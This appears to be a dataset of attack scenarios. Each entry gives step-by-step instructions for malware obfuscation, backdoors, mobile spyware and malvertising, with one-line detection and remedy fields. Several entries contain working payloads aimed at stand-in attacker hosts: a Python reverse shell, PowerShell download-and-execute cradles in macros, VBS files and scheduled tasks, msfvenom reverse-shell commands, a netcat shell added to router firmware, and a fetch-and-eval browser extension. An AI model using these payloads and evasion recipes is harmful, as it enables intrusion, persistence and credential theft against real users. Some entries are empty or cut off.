Title: MSBuild Inline Task Obfuscation
Scenario Description: A malicious MSBuild XML project is created with inline obfuscated C# code that downloads and runs payload.
Attack Steps: Step 1: Write a malicious C# payload (e.g., reverse shell).Step 2: Create a .proj XML file that defines an inline task using <UsingTask> inside <Project>.Step 3: Obfuscate all strings in C# code using base64 or char arrays.Step 4: Run using: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe evil.projStep 5: Payload executes using only Microsoft-native tools.Step 6: This bypasses AV because the tool is trusted and the payload is executed in-memory.
Detection Method: Monitor MSBuild executions
Solution: Disable MSBuild on endpoints

Title: Script Obfuscation with Eval and Regex
Scenario Description: JavaScript malware payload is split and reconstructed using eval with regex logic to prevent analysis.
Attack Steps: Step 1: Write a malicious JS payload (e.g., document stealer).Step 2: Break the script into 10+ chunks and store each as string variables.Step 3: Reassemble the code using eval(var1+var2+...) wrapped inside a regex-based trigger.Step 4: Place the script in a .html file and embed inside an email.Step 5: User opens file in browser, malware runs silently.Step 6: Obfuscation confuses static tools and hides full code.
Detection Method: Script debugger, manual reassembly
Solution: Block eval, content security policy

Title: Malware in Archive Bomb (Nested ZIPs)
Scenario Description: Attacker hides malware deep inside multiple levels of nested ZIP files to exhaust AV scanners or evade them entirely.
Attack Steps: Step 1: Create malware payload payload.exe.Step 2: Compress it inside a ZIP file, then compress that ZIP inside another ZIP. Repeat this process 20+ times.Step 3: Name the final archive as HR_Policy.zip.Step 4: Attach it to an email with a message like “Please check the new HR policy”.Step 5: Victim unzips several layers, finally reaches executable.Step 6: AV scanners often timeout or skip deep nested files, allowing the malware to pass.
Detection Method: Recursive AV scanners, unzip limit
Solution: Limit extraction layers

Title: PowerShell Encoded Launcher in Registry
Scenario Description: PowerShell malware is hidden in Windows Registry and triggered with a small launcher.
Attack Steps: Step 1: Encode a reverse shell PowerShell script using Base64.Step 2: Store it in Registry using:Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\' -Name 'Update' -Value '<Base64>'Step 3: Create a launcher script:`$script = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Office'
Target Type: Select-Object -ExpandProperty Update ; IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($script)))`Step 4: Send launcher via USB or email.Step 5: On execution, it pulls the real code from Registry — no malicious code on disk.
Detection Method: In-memory malware from registry
Solution: Registry activity monitoring

Title: HTA Dropper with Polyglot Payload
Scenario Description: A malicious HTA file carries JavaScript and VBScript mixed together, with the real payload stored in base64 or hexadecimal.
Attack Steps: Step 1: Create an .hta file and mix VBScript and JavaScript in the header.Step 2: Encode a secondary payload in base64 or hex (e.g., payload.exe).Step 3: Use the script to decode and write it to disk at runtime.Step 4: Add fake user message (e.g., "Your file is ready") to avoid suspicion.Step 5: Attach HTA to email with label like “Document Viewer”.Step 6: Victim opens file, malware gets saved and executed.
Detection Method: Monitor HTA behavior
Solution: Disable HTA and scripting engines

Title: Obfuscated LNK File as Initial Payload
Scenario Description: A .lnk (Windows shortcut) file is created to silently run a hidden script or executable using obfuscated commands.
Attack Steps: Step 1: Create a PowerShell script that downloads malware.Step 2: Save the script as hidden.ps1 and hide it using file attributes (attrib +h).Step 3: Use shortcut.exe or manual LNK creation to point to PowerShell with command:powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File hidden.ps1Step 4: Rename shortcut as Invoice.lnk and use icon from Word to disguise it.Step 5: Send via email or USB.Step 6: Victim opens shortcut, thinking it's a document — script executes malware silently.
Detection Method: LNK command inspection
Solution: Block scripts from shortcuts

Title: XOR-Encoded Executable with Loader
Scenario Description: A malware .exe is XOR-encoded and stored in a clean loader that decodes and runs it from memory.
Attack Steps: Step 1: Prepare a malware binary (e.g., reverse shell).Step 2: Write a C++ loader program that includes an XOR key and the encoded binary as an array.Step 3: At runtime, loader decodes the binary in memory.Step 4: Use reflective DLL injection or CreateProcess in memory to run decoded malware.Step 5: Compile the loader and rename it to a generic name like updater.exe.Step 6: Deliver to victim via disguised dropper or phishing.
Detection Method: Memory analysis, entropy scan
Solution: Behavior-based AV, EDR

Title: CMD Obfuscation with Variable Delays
Scenario Description: A batch file uses random delays, variable splitting, and indirect calls to obscure its true purpose.
Attack Steps: Step 1: Write a .bat file with a malicious command (e.g., download payload).Step 2: Obfuscate command like:set a=pow&set b=ersh&set c=ell%a%%b%%c% -enc ...Step 3: Insert fake delays using timeout /nobreak /t 1, fake labels, and noise.Step 4: Save the file as report.bat.Step 5: Send it with message like "Q2 Payroll Script".Step 6: Victim runs the file, malware activates after appearing benign.
Detection Method: Analyze variable logic
Solution: Restrict batch script execution

Title: Dynamic API Resolve with Encrypted Strings
Scenario Description: Malware dynamically resolves system APIs (like WinExec) using obfuscated or encrypted function names.
Attack Steps: Step 1: Write C++ malware that uses Windows APIs.Step 2: Instead of calling them directly, store API names as encrypted strings in the binary.Step 3: At runtime, decrypt names and resolve them using GetProcAddress() and LoadLibrary().Step 4: This avoids static detection of suspicious API calls.Step 5: Compile binary and distribute as part of "driver update".Step 6: AV fails to see true behavior statically — payload runs.
Detection Method: Dynamic hooking / memory dump
Solution: Use EDR with behavior tracing

Title: Python Script Obfuscated with AST Manipulation
Scenario Description: Python malware is transformed by manipulating its abstract syntax tree (AST), changing structure without altering logic.
Attack Steps: Step 1: Write basic Python malware script (e.g., password stealer).Step 2: Use the ast library to programmatically rewrite:- Rename variables- Reorder statements- Inject no-op statementsStep 3: Save the transformed AST back to .py file.Step 4: Encrypt strings and function names.Step 5: Distribute script as “data_cleaner.py”.Step 6: Static reviewers see unreadable code, but script works fully.
Detection Method: Manual inspection, AST diff
Solution: Use script analyzers with AST comparison

Title: Self-Modifying Shellcode Executable
Scenario Description: Shellcode inside an executable modifies itself at runtime to become functional, avoiding initial detection.
Attack Steps: Step 1: Write shellcode payload in assembly.Step 2: Encode it with a custom algorithm (e.g., rotate bits, XOR).Step 3: Add a decoder stub in executable that:- Runs first- Decrypts/repairs the shellcode- Transfers executionStep 4: Compile and rename file like setup64.exe.Step 5: When executed, stub decodes shellcode in memory and runs it.Step 6: Static scans show broken code; runtime works fully.
Detection Method: Runtime memory trace
Solution: Use memory monitoring tools

Title: JavaScript + SVG File Combo
Scenario Description: A payload is hidden in an SVG image that includes JavaScript embedded to run silently when opened.
Attack Steps: Step 1: Create SVG file with benign image or shape.Step 2: Insert <script> tag that loads obfuscated JS from CDATA section.Step 3: Obfuscate the JavaScript using encoding or variable name changes.Step 4: Host SVG as part of a fake “infographic report”.Step 5: When user opens SVG in browser, script runs silently.Step 6: JS executes drive-by download or browser exploit.
Detection Method: Enable CSP, disable inline JS
Solution: SVG viewer restrictions

Title: JavaScript Packed PDF Dropper
Scenario Description: A PDF contains embedded JavaScript that has been heavily obfuscated and drops malware upon opening in an unprotected PDF viewer.
Attack Steps: Step 1: Write a short JavaScript that drops an executable using app.launchURL() or similar.Step 2: Obfuscate the script using techniques like:- Reversed strings- Character encoding (String.fromCharCode)Step 3: Embed the obfuscated JS into the PDF using Acrobat’s “Document JavaScripts” feature.Step 4: Use a real-looking cover page like “Flight Ticket Confirmation”.Step 5: Send the PDF through email with a subject like “Your Flight e-Ticket”.Step 6: When the PDF is opened, JavaScript triggers silently, leading to payload download and execution.
Detection Method: Inspect embedded JS, PDF sandboxing
Solution: Disable JavaScript in readers

Title: Fileless Macro with DCOM Obfuscation
Scenario Description: A malicious Office macro obfuscates its payload and leverages DCOM for execution without writing files to disk.
Attack Steps: Step 1: Create a macro in Excel with VBA that launches obfuscated PowerShell.Step 2: Encode the real command using Base64, and then split it across many variables.Step 3: Use GetObject("script:...") or DCOM calls like:New-Object -ComObject "Shell.Application" to execute.Step 4: Attach macro to Workbook_Open trigger.Step 5: Distribute Excel sheet as "Payroll_Summary_Q3.xlsm".Step 6: Victim enables macros — malware runs entirely in memory using Windows COM components.
Detection Method: Monitor DCOM use, PowerShell logs
Solution: Disable Office macros

Title: Base64 Encoded Payload in Comments
Scenario Description: Malware code is embedded as Base64 inside a file’s comment section and decoded at runtime.
Attack Steps: Step 1: Write a Python payload (e.g., backdoor client).Step 2: Encode entire script using base64.b64encode().Step 3: Paste the base64 string into a multi-line comment like """ ... """.Step 4: At runtime, a small stub reads its own comment block, decodes it, and executes via exec().Step 5: Rename script as “form_parser.py” to avoid suspicion.Step 6: Victim opens and runs script — payload activates from within comment section.
Detection Method: Analyze dynamic behavior
Solution: Use EDRs with runtime inspection

Title: PowerShell with Gzip + Base64 Obfuscation
Scenario Description: A PowerShell payload is compressed using Gzip and Base64-encoded, making it unreadable to static scanners.
Attack Steps: Step 1: Write a full PowerShell script (e.g., keylogger or downloader).Step 2: Compress it using [IO.Compression.GzipStream] and then encode the output using Base64.Step 3: Create a launcher that decodes and decompresses in memory:$stream = [System.IO.Compression.GzipStream]::new(...)Step 4: Deliver this launcher via .ps1 file or inside a macro.Step 5: When executed, the payload unfolds in memory and runs, without visible strings in the source.Step 6: AV sees only gibberish Base64 and skips the payload.
Detection Method: Enable PowerShell script block logging
Solution: Block encoded script execution

Title: Visual Basic Stub Loader with Fake Message Box
Scenario Description: A VBScript is wrapped with fake pop-up messages while the actual payload executes silently in background.
Attack Steps: Step 1: Create a VBScript that includes a malicious PowerShell command using WScript.Shell.Run.Step 2: Add a fake MessageBox like MsgBox "File not found.".Step 3: Insert random delays and meaningless code (Dim a, b, c etc.) to confuse static analysis.Step 4: Save as document_viewer.vbs and attach to ZIP file.Step 5: Send as “HR Documents Viewer Tool”.Step 6: Victim runs it, sees harmless error pop-up, while real payload executes in background.
Detection Method: Script monitor and EDR
Solution: Block VBS execution via policy

Title: Web Server Backdoor with PHP Shell
Scenario Description: Attacker uploads a PHP shell to a web server and gains persistent access via browser
Tools Used: Kali Linux, PHP Shell (e.g., c99.php), Burp Suite
Attack Steps: Step 1: Attacker finds a vulnerable file upload form on a PHP web app. Step 2: Uploads c99.php shell script disguised as .jpg.php via tampered request using Burp Suite. Step 3: Accesses backdoor via browser: http://target.com/uploads/c99.php Step 4: Uses built-in file manager or terminal to execute system commands. Step 5: Maintains access by uploading additional web shells or setting cronjobs via web shell interface.
Detection Method: Web traffic monitoring, anomaly detection
Solution: Secure file uploads, block .php files in upload directories

Title: Android APK Backdoor using msfvenom
Scenario Description: Attacker generates a backdoored Android APK that connects back to Kali Linux via Meterpreter
Attack Steps: Step 1: Attacker runs msfvenom -p android/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8888 -o backdoor.apk to create payload. Step 2: Sends backdoor.apk to target via email or social engineering. Step 3: Target installs APK on Android emulator or rooted device. Step 4: On Kali, attacker sets up listener: msfconsole > use multi/handler. Step 5: Once the app is opened, attacker gets full Meterpreter session for keylogging, camera access, etc.
Detection Method: Mobile AV, APK behavior analysis
Solution: Do not sideload unknown APKs, use verified sources

Title: Reverse SSH Backdoor
Scenario Description: Attacker creates a reverse SSH tunnel from the victim machine to maintain access through firewalls
Attack Steps: Step 1: On victim’s Linux machine, attacker creates SSH key pair: ssh-keygen -t rsa.Step 2: Adds public key to attacker’s server using ssh-copy-id.Step 3: Sets up a cronjob on victim to run:*/5 * * * * ssh -R 2222:localhost:22 attacker@attacker-ip.Step 4: This reverse tunnel allows attacker to connect back even if victim is behind NAT.Step 5: From attacker server: ssh -p 2222 user@localhost connects to victim.
Detection Method: Detect unusual SSH behavior, monitor crontabs
Solution: Block outbound SSH, restrict cron permissions

Title: PowerShell Web Backdoor
Scenario Description: Attacker implants PowerShell-based HTTP listener as a backdoor on a Windows system
Attack Steps: Step 1: Attacker writes a PowerShell script to start a listener:Start-Listener.ps1: Start-Job { Invoke-WebRequest -Uri http://attacker-ip:8080 -OutFile C:\Temp\shell.ps1; Invoke-Expression (Get-Content C:\Temp\shell.ps1) }.Step 2: Places this script in C:\Temp on victim system.Step 3: Creates a scheduled task: schtasks /create /tn "PS_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\Start-Listener.ps1" /sc minute /mo 5.Step 4: Every 5 mins, victim system pulls and runs backdoor code from attacker server.Step 5: Attacker modifies remote payload without needing re-access.
Detection Method: Monitor PowerShell logs, HTTP pulls
Solution: Restrict script execution, remove task

Title: Backdoored Python Script
Scenario Description: Attacker modifies an internal Python script to include a hidden reverse shell
Attack Steps:
Step 1: Attacker gains access to a developer’s shared Python script on internal server.Step 2: Inserts malicious code at the end:python
import socket,subprocess,os
s=socket.socket()
s.connect(("attacker-ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
Step 3: Developer runs script unknowingly.Step 4: Attacker gets reverse shell via nc -lvp 4444.Step 5: Modifies timestamp to hide tampering.
Detection Method: Monitor outbound connections from dev scripts
Solution: Enable script hashing, secure repos

Title: Persistent Meterpreter via Windows Service
Scenario Description: Attacker creates a fake Windows service to maintain a persistent Meterpreter shell
Attack Steps: Step 1: Attacker generates payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=7777 -f exe -o service.exe.Step 2: Places service.exe in C:\Windows\System32.Step 3: Registers fake service: sc create WinUpdate binPath= "C:\Windows\System32\service.exe".Step 4: Starts the service: sc start WinUpdate.Step 5: Listens using multi/handler in Metasploit to maintain shell even after reboot.
Detection Method: Monitor new services, abnormal traffic
Solution: Remove rogue services, disable execution

Title: Remote Access via Macro-Enabled Excel Backdoor
Scenario Description: A malicious macro in an Excel file is used to initiate a reverse shell
Attack Steps:
Step 1: Attacker creates Excel file with malicious macro:vba
Sub AutoOpen()
Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"
End Sub
Step 2: Sends Excel file to victim via phishing or USB.Step 3: When victim opens file and enables macros, it connects to attacker's server and executes PowerShell payload.Step 4: PowerShell script opens reverse shell to attacker.Step 5: Attacker maintains control as long as Excel is opened.
Detection Method: Monitor Office macro activity
Solution: Disable macros, use Protected View

Title: Chrome Extension Backdoor
Scenario Description: A fake Chrome extension includes malicious JavaScript to connect to attacker’s server
Attack Steps: Step 1: Attacker creates a Chrome extension manifest with malicious background.js containing:fetch("http://attacker-ip:8000/commands").then(res => eval(res.text()));Step 2: Extension is packed and renamed to something like “Dark Theme for Gmail”.Step 3: Shared as .crx file to victim via email or local install.Step 4: Once installed, browser fetches code from attacker server every time Chrome opens.Step 5: Attacker can push keyloggers, screenshot commands, or cookie dumpers remotely.
Detection Method: Monitor extension traffic, dev tools
Solution: Only allow trusted extensions, group policies

Title: IoT Router Backdoor via Firmware Injection
Scenario Description: A router firmware is modified to include a persistent backdoor listener
Attack Steps: Step 1: Attacker downloads router firmware (e.g., TP-Link WR841N) from vendor site.Step 2: Extracts it using binwalk -e firmware.bin.Step 3: Modifies rc.local to start a Netcat listener: nc -l -p 1337 -e /bin/sh.Step 4: Repackages firmware using Firmware Mod Kit and uploads via router’s web admin page.Step 5: Once rebooted, router opens hidden shell port 1337 allowing attacker remote access.
Detection Method: Firmware hash validation, port scanning
Solution: Use signed firmware only, isolate network

Title: BIOS-Level Backdoor Implant
Scenario Description: A malicious firmware rootkit is flashed to BIOS to maintain system-level access
Attack Steps: Step 1: Attacker extracts BIOS firmware from a target PC using tools like flashrom.Step 2: Modifies the UEFI driver to execute a hidden shell dropper payload on each boot.Step 3: Re-flashes modified BIOS onto the machine via USB boot.Step 4: On every boot, payload runs from firmware before OS loads.Step 5: Implant is OS-independent and survives reinstallations.
Detection Method: BIOS integrity checks, CHIPSEC alerts
Solution: Use UEFI Secure Boot, BIOS locks

Title: AWS Lambda Function Backdoor
Scenario Description: Attacker modifies Lambda to call an external attacker-controlled server on every trigger
Attack Steps: Step 1: Attacker gains AWS credentials via leaked .aws/credentials file.Step 2: Edits an existing Lambda function to include:requests.get("https://attacker.com/command")Step 3: Every time the Lambda is triggered, it connects to C2 and executes command.Step 4: Attacker updates C2 output in real-time.Step 5: Maintains full serverless remote code execution.
Detection Method: Monitor CloudTrail logs, Lambda calls
Solution: Use IAM roles, rotate keys

Title: .BAT File Hidden in Zip Backdoor
Scenario Description: A .bat file inside a zip file opens reverse shell when extracted and clicked
Attack Steps: Step 1: Attacker creates a .bat script with:@echo offpowershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient('attacker-ip',4444);..."Step 2: Zips it with other legit files (invoice.pdf, terms.docx) and renames it urgent-documents.zip.Step 3: Sends to target via phishing email.Step 4: Victim extracts and double-clicks .bat, reverse shell opens.Step 5: Attacker listens on port 4444 using Netcat.
Detection Method: Monitor ZIP content, PowerShell logs
Solution: Block .bat by GPO, scan emails

Title: GitHub Auto-Updating Backdoor Script
Scenario Description: Attacker plants a script that fetches and runs code hosted on a GitHub repo
Attack Steps: Step 1: Attacker writes a Python script that fetches a file from GitHub:exec(requests.get("https://raw.githubusercontent.com/user/backdoor/main/payload.py").text)Step 2: Places this script as a startup task or cronjob on victim machine.Step 3: Attacker can update payload.py at any time; victim executes latest version on next boot or interval.Step 4: Attacker adds reverse shell, keylogger, or malware to payload.py as needed.Step 5: Backdoor updates silently without re-infecting system.
Detection Method: Monitor GitHub traffic, unusual GET requests
Solution: Restrict outbound script fetching

Title: Dropbox-Based Backdoor Command Channel
Scenario Description: Attacker uses Dropbox to send and receive commands to a victim machine
Attack Steps: Step 1: Attacker creates Dropbox app and gets access token.Step 2: On victim system, Python script runs every 5 mins to check /commands.txt on Dropbox.Step 3: It reads and executes the command (whoami, netstat -an, etc.), uploads result to /output.txt.Step 4: Attacker controls the backdoor by updating the commands.txt via Dropbox site.Step 5: All traffic appears as legitimate Dropbox sync.
Detection Method: Monitor cloud sync behavior
Solution: Restrict unauthorized cloud usage

Title: Reflective DLL Injection Backdoor
Scenario Description: Attacker injects a backdoored DLL into memory of a running process without touching disk
Attack Steps: Step 1: Attacker generates a malicious DLL: msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll > backdoor.dll.Step 2: Uses inject.exe or Metasploit’s post/windows/manage/reflective_dll_injection module.Step 3: Injects DLL into a legit process (e.g., explorer.exe) in memory.Step 4: No file is dropped to disk, making detection harder.Step 5: Attacker gets reverse Meterpreter shell without alerting AVs.
Detection Method: Monitor memory use, abnormal process trees
Solution: Use memory scanning AV, EDR

Title: Python Flask-Based Web Backdoor
Scenario Description: Attacker creates a web app that accepts hidden command parameters and runs them
Attack Steps:
Step 1: Attacker writes a Flask server:python
@app.route("/login")
def login():
cmd = request.args.get("cmd")
if cmd: return subprocess.getoutput(cmd)
return "Login page"
Step 2: Deploys it on victim’s machine under port 5000 as a service.Step 3: From attacker browser: http://victim-ip:5000/login?cmd=whoami executes and shows result.Step 4: Service is disguised as a fake login page.Step 5: Attack persists until service is stopped.
Detection Method: Port scanning, web log inspection
Solution: Secure services, close unused ports

Title: Telegram Bot Backdoor
Scenario Description: A Telegram bot is set up to accept commands from attacker and return output
Attack Steps: Step 1: Attacker creates Telegram bot with BotFather.Step 2: Writes Python script to poll messages and execute commands:bot.sendMessage(chat_id, subprocess.getoutput(update.message.text))Step 3: Runs this script on victim machine as background process.Step 4: Attacker sends ipconfig or dir to bot from mobile.Step 5: Output is sent to Telegram chat – full remote control over Telegram interface.
Detection Method: Monitor API tokens, unusual traffic
Solution: Block messaging API from sensitive hosts

Title: Hidden VBS Backdoor in Startup Folder
Scenario Description: A VBS script runs silently at startup to open reverse shell using PowerShell
Attack Steps: Step 1: Attacker writes backdoor.vbs:Set oShell = CreateObject("WScript.Shell")oShell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')", 0, FalseStep 2: Saves it in C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.Step 3: On next boot, PowerShell payload fetches reverse shell from attacker’s site.Step 4: Attacker gets access with Netcat or Metasploit handler.Step 5: Script remains hidden due to VBS stealth.
Detection Method: Monitor startup folder contents
Solution: Disable scripting or enforce whitelisting

Title: Persistent SSH Backdoor with ForceCommand
Scenario Description: An SSH server is configured to execute only a specific backdoor command regardless of user input
Attack Steps: Step 1: Attacker modifies /etc/ssh/sshd_config:Adds Match User backdooruserForceCommand /home/backdoor.shStep 2: The backdoor.sh script includes a reverse shell line using Netcat or Bash.Step 3: Adds attacker’s key to /home/backdooruser/.ssh/authorized_keys.Step 4: When attacker connects via SSH, no shell is opened — the script runs instead.Step 5: Connection ends after establishing shell back to attacker's host.
Detection Method: Monitor SSH logs, unusual users
Solution: Disable ForceCommand for non-admins

Title: Task Scheduler XML Import Exploit
Scenario Description: Attacker creates a malicious .xml task file that executes reverse shell code on schedule
Attack Steps: Step 1: Attacker creates task.xml with a task that runs:powershell.exe -ExecutionPolicy Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')Step 2: Victim is tricked into running:schtasks /Create /TN "OneDriveUpdate" /XML task.xmlStep 3: Task is hidden and set to run every hour.Step 4: Powershell backdoor is fetched and executed.Step 5: Attacker receives shell via handler.
Detection Method: Audit task history, analyze XML imports
Solution: Limit schtasks usage, block network scripts

Title: Autorun.inf USB Backdoor
Scenario Description: A USB drive uses autorun to execute a hidden backdoor on insertion (legacy support)
Attack Steps: Step 1: Attacker creates autorun.inf:[autorun]open=backdoor.exeStep 2: Places backdoor.exe (reverse shell) in root directory of USB.Step 3: Victim inserts USB into Windows machine.Step 4: If autorun is enabled (rare in modern Windows), payload auto-executes.Step 5: Attacker receives remote shell.
Detection Method: Disable autorun, alert on USB events
Solution: GPO to block autorun, disable USB

Title: Registry RunOnceEx Backdoor
Scenario Description: Payload is set to execute once on next login via RunOnceEx registry key
Attack Steps: Step 1: Attacker places payload.exe in C:\Users\Public\.Step 2: Adds key:reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\900" /v "Shell" /d "C:\Users\Public\payload.exe"Step 3: On next reboot, the payload silently executes.Step 4: Opens a shell or deploys further backdoor mechanisms.Step 5: Key auto-deletes after execution, reducing trace.
Detection Method: Monitor RunOnceEx key usage
Solution: Block RunOnce registry abuse

Title: iOS Spyware Simulation with Jailbroken Device
Scenario Description: A researcher simulates spyware on a jailbroken iPhone to observe unauthorized data collection.
Attack Steps: Step 1: Use a test iPhone and jailbreak it using tools like Checkra1n (for educational use only).Step 2: Install Cydia and Filza file manager.Step 3: Use Cydia to install OpenSSH server on the phone.Step 4: From PC, connect to iPhone via SSH using default root credentials.Step 5: Write a simple bash script that collects SMS database, contact file, and location history.Step 6: Run the script via SSH and transfer data to PC.Step 7: Analyze what files were accessed and whether user detected it.
Vulnerability: Jailbreak exposes full file system, default SSH creds
Detection Method: File integrity monitoring, Jailbreak detection apps
Solution: Avoid jailbreaking; rotate default passwords

Title: Android Banking Trojan Simulation
Scenario Description: Simulates a banking trojan that overlays fake login screens on legitimate banking apps.
Attack Steps: Step 1: Download DroidJack (for educational purposes) and set it up on your PC.Step 2: Generate a malicious APK with a fake banking interface overlay.Step 3: Use an emulator or test Android phone and install the app after enabling "Unknown Sources".Step 4: Launch a legitimate banking app; the malware will detect and overlay its fake login.Step 5: Enter fake credentials and observe data being sent to attacker machine.Step 6: Use Burp Suite to monitor exfiltrated data.Step 7: Check app permissions and logs on Android device.
Vulnerability: App Overlay Abuse, Lack of User Awareness
Detection Method: Permission Tracker, Network Analyzer
Solution: Use Android version with overlay detection; user education

Title: SMS Forwarding Malware
Scenario Description: Malware reads and forwards incoming SMS messages to attacker, used in OTP theft or espionage.
Attack Steps: Step 1: Build a simple SMS listener app in MIT App Inventor or Android Studio.Step 2: In code, add permission to READ_SMS and RECEIVE_SMS.Step 3: Write code to capture incoming SMS and forward to a predefined number or email.Step 4: Sign and install the app on test device (after enabling unknown sources).Step 5: Send SMS to the device and observe if it is forwarded silently.Step 6: Log the SMS data on a server or email inbox for attacker observation.Step 7: Use NetCapture or PCAPdroid on device to confirm exfiltration path.
Vulnerability: SMS permission abuse, weak user review
Detection Method: SMS Monitor App, App Behavior Analysis
Solution: Limit SMS permission; disable unknown sources

Title: Malicious iOS Profile Configuration
Scenario Description: Simulate an attacker sending a malicious configuration profile (.mobileconfig) that routes traffic via attacker-controlled VPN.
Attack Steps: Step 1: On macOS, use Apple Configurator 2 to create a new configuration profile.Step 2: In the profile, add a fake VPN with routing set to the attacker's Burp Suite IP.Step 3: Export the .mobileconfig file and host it on a web server.Step 4: On test iPhone, visit the link and install the profile (simulate user agreement).Step 5: Observe traffic being routed through attacker's machine with Burp Suite.Step 6: Intercept credentials and session data from apps like Safari or email.Step 7: Delete profile and test detection using iOS settings and logs.
Vulnerability: Lack of awareness of config profiles
Detection Method: Profile Viewer, Burp Logs, iOS VPN Monitor
Solution: Do not install profiles unless from verified sources

Title: Malicious Push Notification Phishing
Scenario Description: Simulates malicious push notifications to trick users into entering credentials on phishing page.
Attack Steps: Step 1: Create an Android/iOS app with Firebase Cloud Messaging (FCM) integration.Step 2: Write backend Node.js server to send push messages via FCM.Step 3: Prepare a phishing web page mimicking a banking login.Step 4: App sends a push like “Security Alert! Tap to verify bank account.”Step 5: On tapping, app opens the phishing URL in a WebView.Step 6: User enters credentials; data is captured via form handler on backend.Step 7: Test on emulator or physical device; observe flow and browser URL.Step 8: Log timestamp, user-agent, and entered credentials for analysis.
Detection Method: Network logs, URL filtering

Title: Location Data Leakage from Android

Title: JavaScript Steganography in Ad Images
Scenario Description: Malware is hidden inside ad image files using steganography, decoded by JavaScript at runtime.
Attack Steps: Step 1: Attacker embeds base64-encoded malware into PNG image pixels using steghide.Step 2: Ad with this image is hosted on a test webpage.Step 3: JavaScript on page loads the image and reads pixel data using HTML5 Canvas API.Step 4: Encoded script is extracted and written to a hidden iframe.Step 5: Payload file is generated on-the-fly and auto-downloaded.Step 6: User opens file thinking it's harmless.Step 7: Malware activates and establishes backdoor access.
Detection Method: Monitor canvas usage, image analysis
Solution: Disallow unknown scripts, content filter
Tags: image stego, JS decoder, hidden code

Title: Fake CAPTCHA Redirect to Malware
Scenario Description: A fake ad mimics CAPTCHA to trick users into clicking, then redirects to malware download.
Tools Used: HTML/CSS CAPTCHA UI, JS Redirector, EXE Payload
Attack Steps: Step 1: Attacker creates a fake ad that shows a “Please verify you're human” CAPTCHA.Step 2: Clicking on “I'm not a robot” triggers a JavaScript redirect to download a file.Step 3: The download page claims “Verification tool required to continue.”Step 4: User clicks and downloads an EXE named VerifyNow.exe.Step 5: On execution, the malware installs silently and creates a scheduled task for persistence.Step 6: Malware starts logging keystrokes or camera access (simulated).Step 7: Logs are periodically sent to attacker's FTP server.
Detection Method: URL redirect logs, FTP traffic
Solution: Educate users, block fake UI ads

Title: Malvertising via Malicious Web Fonts
Scenario Description: The attacker creates a custom web font with embedded JavaScript that triggers malware on page render.
Tools Used: Custom WOFF Font, CSS @font-face, JS Payload, Localhost
Attack Steps: Step 1: Create a fake WOFF font with embedded JavaScript using custom encoder.Step 2: Use @font-face in CSS to load this font into an ad block.Step 3: Host ad with embedded CSS on simulated ad network.Step 4: User visits a webpage that loads the ad.Step 5: When the font renders, JS is parsed and executed silently.Step 6: JS drops a script file in %TEMP% and auto-executes.Step 7: Script installs malware or opens a reverse shell (simulate with Netcat).
Detection Method: Font request logs, suspicious temp files
Solution: Disable custom fonts in ads

Title: Malvertising with Compromised Ad Rotator
Scenario Description: Attacker hacks a rotating ad server to occasionally inject malware only for some users.
Tools Used: PHP Ad Rotator, Malware EXE, Burp Suite, Browser
Attack Steps: Step 1: Simulate an ad server with a rotator that serves different ads each time.Step 2: Attacker modifies the server to insert malicious ad 1 out of every 10 times.Step 3: Victim browses site and gets served the malicious ad variant.Step 4: Ad shows a software update and triggers download of EXE file.Step 5: File installs malware with silent execution.Step 6: Due to random injection, detection becomes harder.Step 7: Malware sets up persistence and disables AV via script.
Detection Method: Ad server logs, AV tampering alerts
Solution: Use signed ads, verify ad servers
Tags: ad rotator, stealth dropper, AV killer

Title: Fake Discount Coupon Malware Trap
Scenario Description: User sees an ad offering ₹1,000 discount coupon from Amazon/Flipkart; clicking leads to malware disguised as a coupon generator.
Tools Used: HTML Ad Banner, Fake GUI App, PowerShell Script
Attack Steps: Step 1: Host a site offering “₹1000 Amazon Coupon Generator.”Step 2: The app GUI accepts fake input (e.g., phone number, OTP) to appear functional.Step 3: While running, the app silently executes a PowerShell payload.Step 4: Payload creates scheduled task for persistence.Step 5: App pretends to generate a coupon, then “fails.”Step 6: Meanwhile, malware monitors browser sessions.Step 7: Attacker collects Amazon login credentials.
Detection Method: Monitor PowerShell usage
Solution: Don’t trust coupon apps
Tags: coupon trap, fake discount, credential stealer

Title: Browser Notification-Based Malware Push
Scenario Description: Malicious ad tricks user into enabling browser notifications, which later deliver links to malware.
Tools Used: JS Notification API, Simulated Malware Page, Chrome/Firefox
Attack Steps: Step 1: Malicious ad includes a browser push notification permission prompt.Step 2: User is asked to "Click Allow to continue" while watching a video or reading content.Step 3: Once allowed, attacker sends push notifications via browser with messages like “Urgent Security Alert – Download Fix.”Step 4: Victim clicks the alert, which opens malware download site.Step 5: User downloads and installs disguised malware EXE.Step 6: Malware creates persistence and adds firewall rules to avoid detection.Step 7: Notifications continue even after site is closed.
Detection Method: Browser history + push logs
Solution: Revoke permissions in browser

Title: Fake File Preview with Inline JS Dropper
Scenario Description: Ad shows a fake document preview inside the ad space. When clicked, inline JavaScript silently downloads a malicious file.
Tools Used: JS Dropper Script, HTML Preview, Fake DOC/EXE
